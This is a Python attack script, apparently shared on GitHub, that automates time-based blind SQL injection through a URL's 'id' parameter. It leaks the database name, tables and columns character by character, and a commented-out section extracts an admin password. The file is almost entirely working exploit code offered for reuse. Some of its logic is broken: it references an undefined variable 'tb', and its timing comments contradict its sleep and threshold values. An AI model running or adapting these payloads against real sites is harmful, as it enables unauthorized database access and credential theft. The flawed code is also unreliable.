#=============================================================================#
#============= B__Y____________ M__3__t__a__l__m__3__r__g__3==================#
#=============================================================================#
#
#
#This script is an adaptation of the source code by s4vitar which it develops in a machine 
#for the exploitation of SQL of type Blind, it can be used with several objectives that are SQLi Blind
#
#
#
#Any comment or improvement to the script is welcome, leave it to me in the github comments
#
#
#
#
import requests, time, signal, sys
from pwn import *
#funcion de lo que realziara al hacer ctrl +c 
def def_handler(sig,frame):
	log.failure("Saliendo")
	sys.exit(1) #salida forzafda del programa

#linea para el uso de ctrl +c
signal.signal(signal.SIGINT, def_handler)

#definir la url que vamos a analizar para el sql_injection
url= sys.argv[1]
print(url)
#carcteres que usaremos para que se prueben en la SQLi 
s = r'0123456789abcdefghijklmnopqrstuvwxyz'
#funcion que nos sirve para pporbar nnuestra inyeccion en el campo username usando el tiempo para comprobar la sql inyection
db_name=''
table_name =''
column_names=''
def check(payload):
	data_post = {
		'id':'1 %s' % payload
#		'password':'test'
	}
	time_start=time.time()
	content= requests.get(url,params=data_post)
#	print(content.url)
	time_end=time.time()
	if time_end - time_start > 1: # respuesta del servidor tarda mas de3 5 seg
	 	return 1

#bucle anidado para recorrer cada carcater y obtener el nombre de la database, en este caso posible nombre de 12 carcateres
p2=log.progress("Payload")
#variable que nos servira para ir viendo el nombre construido de la base de datos que se actualizara conforme se vaya generando 
p1=log.progress("Name:")
#bucle para  la databases
for i in range(1,10):
	for c in s:
#payload para nombre de base de datos
		payload = " or if(substr(database(),%d,1)='%c',sleep(0.05),1)-- -" % (i,c) # %d es el digito para ir recorriendo y obtener el nombre de la db  y la %c es el caracter de la db
#		payload = "' or if(substr((select table_name from information_schema.tables where  table_schema='admin' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (j,i,c)
		p2.status("%s" % payload)
#Nos permite ir visualizando cada una de las pruebas para obetener el nombre de la base de datos
		if check(payload):
#anade el carcater que tarde mas de 5 segundos 
			db_name +=c
#aqui iremos viendo el nombre de la db construyendose al ir recorieendo cad acaracter
			p1.status("%s" % db_name)
			break
#mostramos el nombre finalzoado de la db 
log.info("Database: %s" % db_name)
db=db_name


#bucle para las tablas
for j in range(0,2):
	p3 = log.progress("Table Name: [%d]" % j)
#	p3.status("%s" % payload)
	for i in range(1,10):
		for c in s:
			payload= "or if(substr((select table_name from information_schema.tables where  table_schema='%s' limit %d,1),%d,1)='%c',sleep(0.05),1)-- -" % (db,j,i,c)
			p3.status("%s" %payload)
			if check(payload):
				table_name +=c
				p3.status("%s" % table_name)
				break
	p3.success("Tables: %s" % table_name)
	global newtabla
	newtabla=table_name
	table_name=''
print("las tablas son: ", newtabla)
# Bucle para enumerar las columnas de las Db
for j in range(0,3):
	p1=log.progress("Columna: [%d]" % j)
	for i in range(1,10):
		for c in s:
			payload="or if(substr((select column_name from information_schema.columns where table_name='%s' limit %d,1),%d,1)='%c',sleep(0.05),1)-- -" % (tb,j,i,c)
			p1.status("%s" % payload)
			if check(payload):
				column_names +=c
				p1.status("%s" % column_names)
				break
	p1.success("Columns: %s" % column_names)
	column_names=''
# Bucle apara obtener la info de las columnas
#for j in range (0,30):
#	p1.log.progress("Password: [%d]" %j)
#	for c in s:
#		payload="or if(substr((select password from users where username='admin'),%d,1)='%c',sleep(0.2),1)-- -" %(i,c)
#		p2.status("%s" % payload)
#		if check(payload):
#			pas +=c
#			p1.status("%s" % pas)
#			break
#	p1.success("Contrasena: %s" % pas)
#	pas=''
